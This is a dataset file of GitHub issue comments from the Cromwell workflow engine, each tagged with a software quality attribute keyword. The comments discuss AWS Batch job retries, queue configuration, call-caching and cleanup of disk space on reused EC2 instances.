https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-730462165:1202,Testability,test,tested,1202,"Hi Richard,. The Cromwell server is responsible for updating the database. The general; flow of information is AWS Batch -> Cromwell AWS Batch Backend Module ->; Cromwell Metadata actor -> DB. Cromwell only becomes aware of a failure if AWS Batch Backend Module; detects a failure in Batch (usually a non zero return code for the job). I; haven't tested it but I think if you define a retry strategy in the job; definition then Cromwell will not even be aware of the retry unless all of; the retries fail. Any or all of the Metadata entries in the database can be deleted if you; observe weird caching behavior. You can even drop the whole DB and the; Cromwell server will regenerate it the next time it starts. On Thu, Nov 19, 2020 at 3:51 AM Richard Davison <notifications@github.com>; wrote:. > When does the database get notified of a job's failure?; >; > - the moment the job fails; >; > or; >; > - when AWS Batch finally gives up trying to run the job; >; > I'm asking because from what I can tell, once a workflow is in a terminal; > state, some records are deleted from the database, which means that it; > would be impossible to try to run a job in a failed state. This is; > precisely what I tested: I navigated to the failed job in AWS Batch, and; > then pressed the ""Clone Job"" button.; >; > Perhaps a better test would be to literally create a new Job Description; > revision (as you pointed out earlier) to see if Batch a failed attempt can; > be rerun without impacting the status of the workflow.; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-730224182>,; > or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EJLBXTJDA4SKYT4Y43SQTMADANCNFSM4SQ7HRGQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-730462165
https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-730462165:1321,Testability,test,test,1321,"Hi Richard,. The Cromwell server is responsible for updating the database. The general; flow of information is AWS Batch -> Cromwell AWS Batch Backend Module ->; Cromwell Metadata actor -> DB. Cromwell only becomes aware of a failure if AWS Batch Backend Module; detects a failure in Batch (usually a non zero return code for the job). I; haven't tested it but I think if you define a retry strategy in the job; definition then Cromwell will not even be aware of the retry unless all of; the retries fail. Any or all of the Metadata entries in the database can be deleted if you; observe weird caching behavior. You can even drop the whole DB and the; Cromwell server will regenerate it the next time it starts. On Thu, Nov 19, 2020 at 3:51 AM Richard Davison <notifications@github.com>; wrote:. > When does the database get notified of a job's failure?; >; > - the moment the job fails; >; > or; >; > - when AWS Batch finally gives up trying to run the job; >; > I'm asking because from what I can tell, once a workflow is in a terminal; > state, some records are deleted from the database, which means that it; > would be impossible to try to run a job in a failed state. This is; > precisely what I tested: I navigated to the failed job in AWS Batch, and; > then pressed the ""Clone Job"" button.; >; > Perhaps a better test would be to literally create a new Job Description; > revision (as you pointed out earlier) to see if Batch a failed attempt can; > be rerun without impacting the status of the workflow.; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-730224182>,; > or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EJLBXTJDA4SKYT4Y43SQTMADANCNFSM4SQ7HRGQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-730462165
https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-730590208:48,Availability,recover,recovery,48,"> If it works the same approach would allow for recovery in the case of Spot interruption. By the way, speaking of this, how would I submit a job to an on-demand compute environment manually? It seems whenever I submit a workflow to cromwell, it always runs in a spot instance.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-730590208
https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-730590208:48,Safety,recover,recovery,48,"> If it works the same approach would allow for recovery in the case of Spot interruption. By the way, speaking of this, how would I submit a job to an on-demand compute environment manually? It seems whenever I submit a workflow to cromwell, it always runs in a spot instance.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-730590208
https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-731151345:373,Availability,recover,recovery,373,"Currently the cromwell.conf file specifies the ARN of the queue that jobs; are submitted to. You can either change this to a new queue or you can; change the queue to use (or prioritize) a compute environment that uses on; demand instances. On Thu, Nov 19, 2020 at 2:32 PM Richard Davison <notifications@github.com>; wrote:. > If it works the same approach would allow for recovery in the case of Spot; > interruption; >; > By the way, speaking of this, how would I submit a job to an on-demand; > compute environment manually? It seems whenever I submit a workflow to; > cromwell, it always runs in a spot instance.; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-730590208>,; > or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EPPHWFJT3BFIOU2TCLSQVXFVANCNFSM4SQ7HRGQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-731151345
https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-731151345:58,Performance,queue,queue,58,"Currently the cromwell.conf file specifies the ARN of the queue that jobs; are submitted to. You can either change this to a new queue or you can; change the queue to use (or prioritize) a compute environment that uses on; demand instances. On Thu, Nov 19, 2020 at 2:32 PM Richard Davison <notifications@github.com>; wrote:. > If it works the same approach would allow for recovery in the case of Spot; > interruption; >; > By the way, speaking of this, how would I submit a job to an on-demand; > compute environment manually? It seems whenever I submit a workflow to; > cromwell, it always runs in a spot instance.; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-730590208>,; > or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EPPHWFJT3BFIOU2TCLSQVXFVANCNFSM4SQ7HRGQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-731151345
https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-731151345:129,Performance,queue,queue,129,"Currently the cromwell.conf file specifies the ARN of the queue that jobs; are submitted to. You can either change this to a new queue or you can; change the queue to use (or prioritize) a compute environment that uses on; demand instances. On Thu, Nov 19, 2020 at 2:32 PM Richard Davison <notifications@github.com>; wrote:. > If it works the same approach would allow for recovery in the case of Spot; > interruption; >; > By the way, speaking of this, how would I submit a job to an on-demand; > compute environment manually? It seems whenever I submit a workflow to; > cromwell, it always runs in a spot instance.; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-730590208>,; > or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EPPHWFJT3BFIOU2TCLSQVXFVANCNFSM4SQ7HRGQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-731151345
https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-731151345:158,Performance,queue,queue,158,"Currently the cromwell.conf file specifies the ARN of the queue that jobs; are submitted to. You can either change this to a new queue or you can; change the queue to use (or prioritize) a compute environment that uses on; demand instances. On Thu, Nov 19, 2020 at 2:32 PM Richard Davison <notifications@github.com>; wrote:. > If it works the same approach would allow for recovery in the case of Spot; > interruption; >; > By the way, speaking of this, how would I submit a job to an on-demand; > compute environment manually? It seems whenever I submit a workflow to; > cromwell, it always runs in a spot instance.; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-730590208>,; > or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EPPHWFJT3BFIOU2TCLSQVXFVANCNFSM4SQ7HRGQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-731151345
https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-731151345:373,Safety,recover,recovery,373,"Currently the cromwell.conf file specifies the ARN of the queue that jobs; are submitted to. You can either change this to a new queue or you can; change the queue to use (or prioritize) a compute environment that uses on; demand instances. On Thu, Nov 19, 2020 at 2:32 PM Richard Davison <notifications@github.com>; wrote:. > If it works the same approach would allow for recovery in the case of Spot; > interruption; >; > By the way, speaking of this, how would I submit a job to an on-demand; > compute environment manually? It seems whenever I submit a workflow to; > cromwell, it always runs in a spot instance.; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-730590208>,; > or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EPPHWFJT3BFIOU2TCLSQVXFVANCNFSM4SQ7HRGQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-731151345
https://github.com/broadinstitute/cromwell/issues/5947#issuecomment-713903125:180,Modifiability,config,config,180,"Hi,. I came across this a little while ago when writing a local provider, you're able to get around this, if it's the same issue, by adding this to your runtime attributes in your config file. ```; runtime-attributes = """"""; String? docker; String? docker_user; Int? runtime_minutes; Int? cpus; Int? mem; """"""; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5947#issuecomment-713903125
https://github.com/broadinstitute/cromwell/issues/5966#issuecomment-714180309:0,Deployability,Update,Update,0,"Update:. Issue is that we were updating the resource requests and cromwell was seeing this as a new run, is there anyway to update the resource requests while allowing cromwell to resume the call-caching?. Thanks!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5966#issuecomment-714180309
https://github.com/broadinstitute/cromwell/issues/5966#issuecomment-714180309:124,Deployability,update,update,124,"Update:. Issue is that we were updating the resource requests and cromwell was seeing this as a new run, is there anyway to update the resource requests while allowing cromwell to resume the call-caching?. Thanks!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5966#issuecomment-714180309
https://github.com/broadinstitute/cromwell/issues/5966#issuecomment-714180309:180,Usability,resume,resume,180,"Update:. Issue is that we were updating the resource requests and cromwell was seeing this as a new run, is there anyway to update the resource requests while allowing cromwell to resume the call-caching?. Thanks!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5966#issuecomment-714180309
https://github.com/broadinstitute/cromwell/pull/5969#issuecomment-714540973:179,Deployability,deploy,deployed,179,"Usually when config and code are in disagreement I'd lean towards correcting the config to match the code rather than the other way round, especially if the code has already been deployed... but in this case if nobody is using the ""wrong"" code value then fixing the code to be consistent with all the other options seems fine to me.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5969#issuecomment-714540973
https://github.com/broadinstitute/cromwell/pull/5969#issuecomment-714540973:13,Modifiability,config,config,13,"Usually when config and code are in disagreement I'd lean towards correcting the config to match the code rather than the other way round, especially if the code has already been deployed... but in this case if nobody is using the ""wrong"" code value then fixing the code to be consistent with all the other options seems fine to me.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5969#issuecomment-714540973
https://github.com/broadinstitute/cromwell/pull/5969#issuecomment-714540973:81,Modifiability,config,config,81,"Usually when config and code are in disagreement I'd lean towards correcting the config to match the code rather than the other way round, especially if the code has already been deployed... but in this case if nobody is using the ""wrong"" code value then fixing the code to be consistent with all the other options seems fine to me.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5969#issuecomment-714540973
https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-716230443:315,Availability,down,down,315,"Hi Luyu,. Thanks for the feedback. This is an interesting case. Normally if there is; a few minutes gap between workflows the instances will be terminated by; batch and the disks will be reclaimed so each workflow starts from scratch. However in your case there isn’t a pause in work long enough for Batch to; shut down the instances. Also because these files are written to a mounted disk they are not deleted; when the container terminates. I think this fix is simple if I add a cleanup step. I will do this ASAP. Thanks,; Mark. On Sat, Oct 24, 2020 at 5:27 AM Luyu <notifications@github.com> wrote:. > Hi,; >; > I have set up a Cromwell platform on AWS batch according to; > https://docs.opendata.aws/genomics-workflows/orchestration/cromwell/cromwell-overview/; >; > If I run GATK Best Practice pipeline for one sample, it works perfectly.; > However, when I ran this pipeline for 10+ samples concurrently, many AWS; > EC2 instances were re-used by AWS batch. Cromwell didn't clean up the; > localized S3 files and output files produced by previous tasks. This; > quickly inflated EBS cost when EBS autoscaling is enabled. One of my; > instances went up to 9.1TB and hit the upper bound for autoscaling, then; > the running task failed due to no space.; >; > I have checked Cromwell documents and some materials from AWS, as well as; > issue #4323 <https://github.com/broadinstitute/cromwell/issues/4323>. But; > none of them works for me. Thank you in advance for any suggestions.; >; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5974>, or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EPKRNY6TFQPVAG2Q4DSMKMZZANCNFSM4S5OX5IA>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-716230443
https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-716230443:799,Deployability,pipeline,pipeline,799,"Hi Luyu,. Thanks for the feedback. This is an interesting case. Normally if there is; a few minutes gap between workflows the instances will be terminated by; batch and the disks will be reclaimed so each workflow starts from scratch. However in your case there isn’t a pause in work long enough for Batch to; shut down the instances. Also because these files are written to a mounted disk they are not deleted; when the container terminates. I think this fix is simple if I add a cleanup step. I will do this ASAP. Thanks,; Mark. On Sat, Oct 24, 2020 at 5:27 AM Luyu <notifications@github.com> wrote:. > Hi,; >; > I have set up a Cromwell platform on AWS batch according to; > https://docs.opendata.aws/genomics-workflows/orchestration/cromwell/cromwell-overview/; >; > If I run GATK Best Practice pipeline for one sample, it works perfectly.; > However, when I ran this pipeline for 10+ samples concurrently, many AWS; > EC2 instances were re-used by AWS batch. Cromwell didn't clean up the; > localized S3 files and output files produced by previous tasks. This; > quickly inflated EBS cost when EBS autoscaling is enabled. One of my; > instances went up to 9.1TB and hit the upper bound for autoscaling, then; > the running task failed due to no space.; >; > I have checked Cromwell documents and some materials from AWS, as well as; > issue #4323 <https://github.com/broadinstitute/cromwell/issues/4323>. But; > none of them works for me. Thank you in advance for any suggestions.; >; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5974>, or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EPKRNY6TFQPVAG2Q4DSMKMZZANCNFSM4S5OX5IA>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-716230443
https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-716230443:872,Deployability,pipeline,pipeline,872,"Hi Luyu,. Thanks for the feedback. This is an interesting case. Normally if there is; a few minutes gap between workflows the instances will be terminated by; batch and the disks will be reclaimed so each workflow starts from scratch. However in your case there isn’t a pause in work long enough for Batch to; shut down the instances. Also because these files are written to a mounted disk they are not deleted; when the container terminates. I think this fix is simple if I add a cleanup step. I will do this ASAP. Thanks,; Mark. On Sat, Oct 24, 2020 at 5:27 AM Luyu <notifications@github.com> wrote:. > Hi,; >; > I have set up a Cromwell platform on AWS batch according to; > https://docs.opendata.aws/genomics-workflows/orchestration/cromwell/cromwell-overview/; >; > If I run GATK Best Practice pipeline for one sample, it works perfectly.; > However, when I ran this pipeline for 10+ samples concurrently, many AWS; > EC2 instances were re-used by AWS batch. Cromwell didn't clean up the; > localized S3 files and output files produced by previous tasks. This; > quickly inflated EBS cost when EBS autoscaling is enabled. One of my; > instances went up to 9.1TB and hit the upper bound for autoscaling, then; > the running task failed due to no space.; >; > I have checked Cromwell documents and some materials from AWS, as well as; > issue #4323 <https://github.com/broadinstitute/cromwell/issues/4323>. But; > none of them works for me. Thank you in advance for any suggestions.; >; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5974>, or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EPKRNY6TFQPVAG2Q4DSMKMZZANCNFSM4S5OX5IA>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-716230443
https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-716230443:897,Performance,concurren,concurrently,897,"Hi Luyu,. Thanks for the feedback. This is an interesting case. Normally if there is; a few minutes gap between workflows the instances will be terminated by; batch and the disks will be reclaimed so each workflow starts from scratch. However in your case there isn’t a pause in work long enough for Batch to; shut down the instances. Also because these files are written to a mounted disk they are not deleted; when the container terminates. I think this fix is simple if I add a cleanup step. I will do this ASAP. Thanks,; Mark. On Sat, Oct 24, 2020 at 5:27 AM Luyu <notifications@github.com> wrote:. > Hi,; >; > I have set up a Cromwell platform on AWS batch according to; > https://docs.opendata.aws/genomics-workflows/orchestration/cromwell/cromwell-overview/; >; > If I run GATK Best Practice pipeline for one sample, it works perfectly.; > However, when I ran this pipeline for 10+ samples concurrently, many AWS; > EC2 instances were re-used by AWS batch. Cromwell didn't clean up the; > localized S3 files and output files produced by previous tasks. This; > quickly inflated EBS cost when EBS autoscaling is enabled. One of my; > instances went up to 9.1TB and hit the upper bound for autoscaling, then; > the running task failed due to no space.; >; > I have checked Cromwell documents and some materials from AWS, as well as; > issue #4323 <https://github.com/broadinstitute/cromwell/issues/4323>. But; > none of them works for me. Thank you in advance for any suggestions.; >; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5974>, or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EPKRNY6TFQPVAG2Q4DSMKMZZANCNFSM4S5OX5IA>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-716230443
https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-716230443:25,Usability,feedback,feedback,25,"Hi Luyu,. Thanks for the feedback. This is an interesting case. Normally if there is; a few minutes gap between workflows the instances will be terminated by; batch and the disks will be reclaimed so each workflow starts from scratch. However in your case there isn’t a pause in work long enough for Batch to; shut down the instances. Also because these files are written to a mounted disk they are not deleted; when the container terminates. I think this fix is simple if I add a cleanup step. I will do this ASAP. Thanks,; Mark. On Sat, Oct 24, 2020 at 5:27 AM Luyu <notifications@github.com> wrote:. > Hi,; >; > I have set up a Cromwell platform on AWS batch according to; > https://docs.opendata.aws/genomics-workflows/orchestration/cromwell/cromwell-overview/; >; > If I run GATK Best Practice pipeline for one sample, it works perfectly.; > However, when I ran this pipeline for 10+ samples concurrently, many AWS; > EC2 instances were re-used by AWS batch. Cromwell didn't clean up the; > localized S3 files and output files produced by previous tasks. This; > quickly inflated EBS cost when EBS autoscaling is enabled. One of my; > instances went up to 9.1TB and hit the upper bound for autoscaling, then; > the running task failed due to no space.; >; > I have checked Cromwell documents and some materials from AWS, as well as; > issue #4323 <https://github.com/broadinstitute/cromwell/issues/4323>. But; > none of them works for me. Thank you in advance for any suggestions.; >; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5974>, or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EPKRNY6TFQPVAG2Q4DSMKMZZANCNFSM4S5OX5IA>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-716230443
https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-716230443:270,Usability,pause,pause,270,"Hi Luyu,. Thanks for the feedback. This is an interesting case. Normally if there is; a few minutes gap between workflows the instances will be terminated by; batch and the disks will be reclaimed so each workflow starts from scratch. However in your case there isn’t a pause in work long enough for Batch to; shut down the instances. Also because these files are written to a mounted disk they are not deleted; when the container terminates. I think this fix is simple if I add a cleanup step. I will do this ASAP. Thanks,; Mark. On Sat, Oct 24, 2020 at 5:27 AM Luyu <notifications@github.com> wrote:. > Hi,; >; > I have set up a Cromwell platform on AWS batch according to; > https://docs.opendata.aws/genomics-workflows/orchestration/cromwell/cromwell-overview/; >; > If I run GATK Best Practice pipeline for one sample, it works perfectly.; > However, when I ran this pipeline for 10+ samples concurrently, many AWS; > EC2 instances were re-used by AWS batch. Cromwell didn't clean up the; > localized S3 files and output files produced by previous tasks. This; > quickly inflated EBS cost when EBS autoscaling is enabled. One of my; > instances went up to 9.1TB and hit the upper bound for autoscaling, then; > the running task failed due to no space.; >; > I have checked Cromwell documents and some materials from AWS, as well as; > issue #4323 <https://github.com/broadinstitute/cromwell/issues/4323>. But; > none of them works for me. Thank you in advance for any suggestions.; >; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5974>, or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EPKRNY6TFQPVAG2Q4DSMKMZZANCNFSM4S5OX5IA>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-716230443
https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-716230443:463,Usability,simpl,simple,463,"Hi Luyu,. Thanks for the feedback. This is an interesting case. Normally if there is; a few minutes gap between workflows the instances will be terminated by; batch and the disks will be reclaimed so each workflow starts from scratch. However in your case there isn’t a pause in work long enough for Batch to; shut down the instances. Also because these files are written to a mounted disk they are not deleted; when the container terminates. I think this fix is simple if I add a cleanup step. I will do this ASAP. Thanks,; Mark. On Sat, Oct 24, 2020 at 5:27 AM Luyu <notifications@github.com> wrote:. > Hi,; >; > I have set up a Cromwell platform on AWS batch according to; > https://docs.opendata.aws/genomics-workflows/orchestration/cromwell/cromwell-overview/; >; > If I run GATK Best Practice pipeline for one sample, it works perfectly.; > However, when I ran this pipeline for 10+ samples concurrently, many AWS; > EC2 instances were re-used by AWS batch. Cromwell didn't clean up the; > localized S3 files and output files produced by previous tasks. This; > quickly inflated EBS cost when EBS autoscaling is enabled. One of my; > instances went up to 9.1TB and hit the upper bound for autoscaling, then; > the running task failed due to no space.; >; > I have checked Cromwell documents and some materials from AWS, as well as; > issue #4323 <https://github.com/broadinstitute/cromwell/issues/4323>. But; > none of them works for me. Thank you in advance for any suggestions.; >; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5974>, or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EPKRNY6TFQPVAG2Q4DSMKMZZANCNFSM4S5OX5IA>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-716230443
https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-716242694:313,Availability,down,down,313,"> Hi Luyu, Thanks for the feedback. This is an interesting case. Normally if there is a few minutes gap between workflows the instances will be terminated by batch and the disks will be reclaimed so each workflow starts from scratch. However in your case there isn’t a pause in work long enough for Batch to shut down the instances. Also because these files are written to a mounted disk they are not deleted when the container terminates. I think this fix is simple if I add a cleanup step. I will do this ASAP. Thanks, Mark; > […](#); > On Sat, Oct 24, 2020 at 5:27 AM Luyu ***@***.***> wrote: Hi, I have set up a Cromwell platform on AWS batch according to https://docs.opendata.aws/genomics-workflows/orchestration/cromwell/cromwell-overview/ If I run GATK Best Practice pipeline for one sample, it works perfectly. However, when I ran this pipeline for 10+ samples concurrently, many AWS EC2 instances were re-used by AWS batch. Cromwell didn't clean up the localized S3 files and output files produced by previous tasks. This quickly inflated EBS cost when EBS autoscaling is enabled. One of my instances went up to 9.1TB and hit the upper bound for autoscaling, then the running task failed due to no space. I have checked Cromwell documents and some materials from AWS, as well as issue #4323 <#4323>. But none of them works for me. Thank you in advance for any suggestions. — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5974>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AF2E6EPKRNY6TFQPVAG2Q4DSMKMZZANCNFSM4S5OX5IA> . Hi Mark,. Thanks for your reply. I think I find a workaround (probably close to a real solution). I find the script for a container to run is generated at https://github.com/broadinstitute/cromwell/blob/491082aa3e5b3bd5657f339c959260951333e638/backend/src/main/scala/cromwell/backend/standard/StandardAsyncExecutionActor.scala#L435 . The `SCRIPT_EPILOGUE` has a default value `sy",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-716242694
https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-716242694:775,Deployability,pipeline,pipeline,775,"> Hi Luyu, Thanks for the feedback. This is an interesting case. Normally if there is a few minutes gap between workflows the instances will be terminated by batch and the disks will be reclaimed so each workflow starts from scratch. However in your case there isn’t a pause in work long enough for Batch to shut down the instances. Also because these files are written to a mounted disk they are not deleted when the container terminates. I think this fix is simple if I add a cleanup step. I will do this ASAP. Thanks, Mark; > […](#); > On Sat, Oct 24, 2020 at 5:27 AM Luyu ***@***.***> wrote: Hi, I have set up a Cromwell platform on AWS batch according to https://docs.opendata.aws/genomics-workflows/orchestration/cromwell/cromwell-overview/ If I run GATK Best Practice pipeline for one sample, it works perfectly. However, when I ran this pipeline for 10+ samples concurrently, many AWS EC2 instances were re-used by AWS batch. Cromwell didn't clean up the localized S3 files and output files produced by previous tasks. This quickly inflated EBS cost when EBS autoscaling is enabled. One of my instances went up to 9.1TB and hit the upper bound for autoscaling, then the running task failed due to no space. I have checked Cromwell documents and some materials from AWS, as well as issue #4323 <#4323>. But none of them works for me. Thank you in advance for any suggestions. — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5974>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AF2E6EPKRNY6TFQPVAG2Q4DSMKMZZANCNFSM4S5OX5IA> . Hi Mark,. Thanks for your reply. I think I find a workaround (probably close to a real solution). I find the script for a container to run is generated at https://github.com/broadinstitute/cromwell/blob/491082aa3e5b3bd5657f339c959260951333e638/backend/src/main/scala/cromwell/backend/standard/StandardAsyncExecutionActor.scala#L435 . The `SCRIPT_EPILOGUE` has a default value `sy",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-716242694
https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-716242694:845,Deployability,pipeline,pipeline,845,"> Hi Luyu, Thanks for the feedback. This is an interesting case. Normally if there is a few minutes gap between workflows the instances will be terminated by batch and the disks will be reclaimed so each workflow starts from scratch. However in your case there isn’t a pause in work long enough for Batch to shut down the instances. Also because these files are written to a mounted disk they are not deleted when the container terminates. I think this fix is simple if I add a cleanup step. I will do this ASAP. Thanks, Mark; > […](#); > On Sat, Oct 24, 2020 at 5:27 AM Luyu ***@***.***> wrote: Hi, I have set up a Cromwell platform on AWS batch according to https://docs.opendata.aws/genomics-workflows/orchestration/cromwell/cromwell-overview/ If I run GATK Best Practice pipeline for one sample, it works perfectly. However, when I ran this pipeline for 10+ samples concurrently, many AWS EC2 instances were re-used by AWS batch. Cromwell didn't clean up the localized S3 files and output files produced by previous tasks. This quickly inflated EBS cost when EBS autoscaling is enabled. One of my instances went up to 9.1TB and hit the upper bound for autoscaling, then the running task failed due to no space. I have checked Cromwell documents and some materials from AWS, as well as issue #4323 <#4323>. But none of them works for me. Thank you in advance for any suggestions. — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5974>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AF2E6EPKRNY6TFQPVAG2Q4DSMKMZZANCNFSM4S5OX5IA> . Hi Mark,. Thanks for your reply. I think I find a workaround (probably close to a real solution). I find the script for a container to run is generated at https://github.com/broadinstitute/cromwell/blob/491082aa3e5b3bd5657f339c959260951333e638/backend/src/main/scala/cromwell/backend/standard/StandardAsyncExecutionActor.scala#L435 . The `SCRIPT_EPILOGUE` has a default value `sy",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-716242694
